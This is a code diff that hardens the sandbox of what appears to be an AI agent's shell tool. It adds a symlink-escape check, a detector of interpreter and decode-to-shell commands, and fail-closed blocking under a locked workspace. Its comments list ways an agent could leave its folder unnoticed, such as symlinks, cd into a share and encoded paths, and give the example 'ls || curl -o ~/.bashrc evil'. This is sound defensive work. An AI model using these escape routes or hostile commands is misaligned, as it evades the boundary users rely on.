@@ -868,6 +868,95 @@ def _bash_paths_outside(cmd: str, workspace: Path) -> list[str]:
     return out
 
 
+# Path-shaped tokens, relative ones included. _ABS_PATH_RE only matches
+# absolute paths, which is why a symlink was invisible: `cat link/x` names
+# nothing absolute, so nothing looked at it.
+_REL_PATH_RE = re.compile(r"(?<![\w/])([\w.][\w.\-]*(?:/[\w.\-]+)+/?)")
+
+
+# Commands whose real target is not in the command text.
+_INTERPRETER_RE = re.compile(
+    r"(?:^|[;&|`$(]\s*)\s*(?:"
+    r"python[0-9.]*\s+-c|python[0-9.]*\s*<|"
+    r"perl\s+-e|ruby\s+-e|node\s+-e|php\s+-r|"
+    r"eval|exec|source|\.\s|"
+    r"make|xargs|env\s+[A-Za-z_]+=|"
+    r"base64\s+(?:-d|--decode)|"
+    r"find\b[^;|&]*-exec"
+    r")\b"
+)
+
+
+def _is_interpreter_invocation(cmd: str) -> bool:
+    """True when the command's real target cannot be read from its text.
+
+    Not a judgement about danger -- `python -c "print(1)"` is harmless. It
+    is a judgement about VISIBILITY: a scanner that decides on the command
+    string cannot decide about these, so under a locked scope they belong
+    in front of the user rather than on the auto-allow list.
+    """
+    try:
+        text = cmd or ""
+        if _INTERPRETER_RE.search(text):
+            return True
+        # A pipe into a shell or an interpreter: `... | bash`, `... | python3`.
+        return bool(re.search(
+            r"\|\s*(?:ba|z|k|da)?sh\b|\|\s*python[0-9.]*\b", text))
+    except Exception:
+        return True
+
+
+def _bash_symlink_escapes(cmd: str, workspace: Path) -> list[str]:
+    """Tokens in *cmd* that RESOLVE outside *workspace*.
+
+    The absolute-path scanner reads the command as written. A symlink
+    inside the folder pointing out of it is written as an ordinary
+    relative path, so `cat shared/personal.xlsx` looked local and was not,
+    and `cd shared && cat x` walked out without a single `..`.
+
+    A symlink into a department share is a normal thing to find in an
+    office folder, which is what makes this the escape a model reaches by
+    accident rather than on purpose.
+
+    Only tokens that exist are considered, and only ones that actually
+    move: a path resolving to where it appeared to point is not reported.
+    """
+    out: list[str] = []
+    try:
+        ws = Path(workspace).resolve()
+    except OSError:
+        return out
+    seen: set[str] = set()
+    try:
+        text = cmd or ""
+        candidates = [m.group(1) for m in _REL_PATH_RE.finditer(text)]
+        candidates += [m.group(1) for m in _ABS_PATH_RE.finditer(text)]
+        # A bare directory name has no slash, so the patterns above miss it.
+        # `cd shared && cat x` needs no `..` and names nothing absolute, and
+        # every command after it is then evaluated somewhere else entirely.
+        candidates += re.findall(r"(?:^|[;&|]\s*)cd\s+([^\s;&|<>]+)", text)
+        for token in candidates:
+            if token in seen:
+                continue
+            seen.add(token)
+            try:
+                raw = Path(token).expanduser()
+                joined = raw if raw.is_absolute() else (ws / raw)
+                if not (joined.exists() or joined.parent.exists()):
+                    continue
+                resolved = joined.resolve()
+            except (OSError, RuntimeError):
+                continue
+            if str(resolved).startswith(_SYSTEM_PATH_PREFIXES):
+                continue
+            if resolved == ws or str(resolved).startswith(str(ws) + "/"):
+                continue
+            out.append(f"{token} -> {resolved}")
+    except Exception:
+        return out
+    return out
+
+
 def _bash_write_targets(cmd: str) -> list[str]:
     """Paths a shell command would plausibly WRITE to.
 
@@ -1975,6 +2064,17 @@ class KitToolPermissions:
         return None
 
     def matches_bash_auto_allow(self, cmd: str) -> bool:
+        # Under a locked scope, an interpreter is never auto-allowed. The
+        # auto-allow list is checked BEFORE any confirmation and without
+        # regard to the boundary, and the boundary is enforced by reading
+        # the command text -- which is exactly what an interpreter hides.
+        # `python -c` can build a path from chr(47), `base64 -d | bash`
+        # carries one encoded, `xargs` reads targets from a file, `make`
+        # runs whatever the Makefile says. None of that is visible to a
+        # scanner, so where the folder IS the promise these have to reach
+        # the user instead of running unattended.
+        if self.scope_locked and _is_interpreter_invocation(cmd):
+            return False
         # A command is auto-allowed only if EVERY shell segment is individually
         # auto-allowed. Start-anchored patterns alone would trust a compound by
         # its first (safe) segment — e.g. ``ls || curl -o ~/.bashrc evil`` —
@@ -7914,7 +8014,21 @@ class _DocToolExecutor:
             for pat, label in self._EGRESS_PATTERNS:
                 if re.search(pat, cmd, re.IGNORECASE):
                     return label
-        except Exception:
+        except Exception as exc:
+            # Fail CLOSED under a locked scope. Everywhere else an
+            # unparseable command falls through to the other gates and to
+            # filesystem isolation; where the folder IS the promise there is
+            # nothing behind this, and "we could not read it" must not mean
+            # "so it may run".
+            if getattr(perms, "scope_locked", False):
+                _record_security_event(
+                    "locked_scope_parse", "bash", str(exc)[:80], blocked=True)
+                return json.dumps({"error": (
+                    "blocked: this command could not be checked against the "
+                    f"boundary of {perms.workspace}, and this session cannot "
+                    "run what it cannot check. Rewrite it as something "
+                    "simpler, or tell the user what you need."
+                )})
             return None
         return None
 
@@ -9214,6 +9328,16 @@ class _DocToolExecutor:
                         f"{perms.workspace} with '..'. This session works "
                         "only inside that folder — use paths relative to it."
                     )})
+                hops = _bash_symlink_escapes(cmd, perms.workspace)
+                if hops:
+                    _record_security_event(
+                        "locked_scope_symlink", "bash", cmd[:80], blocked=True)
+                    return json.dumps({"error": (
+                        f"blocked: this command reaches outside "
+                        f"{perms.workspace} through a link ({hops[0]}). The "
+                        "path looks local but does not stay local. This "
+                        "session works only inside that folder."
+                    )})
                 strays = _bash_paths_outside(cmd, perms.workspace)
                 if strays:
                     _record_security_event(
@@ -9244,7 +9368,21 @@ class _DocToolExecutor:
                     return json.dumps({"error": (
                         f"blocked: this command would print '{target}'. {err}"
                     )})
-        except Exception:
+        except Exception as exc:
+            # Fail CLOSED under a locked scope. Everywhere else an
+            # unparseable command falls through to the other gates and to
+            # filesystem isolation; where the folder IS the promise there is
+            # nothing behind this, and "we could not read it" must not mean
+            # "so it may run".
+            if getattr(perms, "scope_locked", False):
+                _record_security_event(
+                    "locked_scope_parse", "bash", str(exc)[:80], blocked=True)
+                return json.dumps({"error": (
+                    "blocked: this command could not be checked against the "
+                    f"boundary of {perms.workspace}, and this session cannot "
+                    "run what it cannot check. Rewrite it as something "
+                    "simpler, or tell the user what you need."
+                )})
             return None
         return None
 
@@ -9290,7 +9428,21 @@ class _DocToolExecutor:
                         "Work inside your workspace with relative paths, or "
                         "ask the user to grant the directory."
                     )})
-        except Exception:
+        except Exception as exc:
+            # Fail CLOSED under a locked scope. Everywhere else an
+            # unparseable command falls through to the other gates and to
+            # filesystem isolation; where the folder IS the promise there is
+            # nothing behind this, and "we could not read it" must not mean
+            # "so it may run".
+            if getattr(perms, "scope_locked", False):
+                _record_security_event(
+                    "locked_scope_parse", "bash", str(exc)[:80], blocked=True)
+                return json.dumps({"error": (
+                    "blocked: this command could not be checked against the "
+                    f"boundary of {perms.workspace}, and this session cannot "
+                    "run what it cannot check. Rewrite it as something "
+                    "simpler, or tell the user what you need."
+                )})
             return None
         return None
 
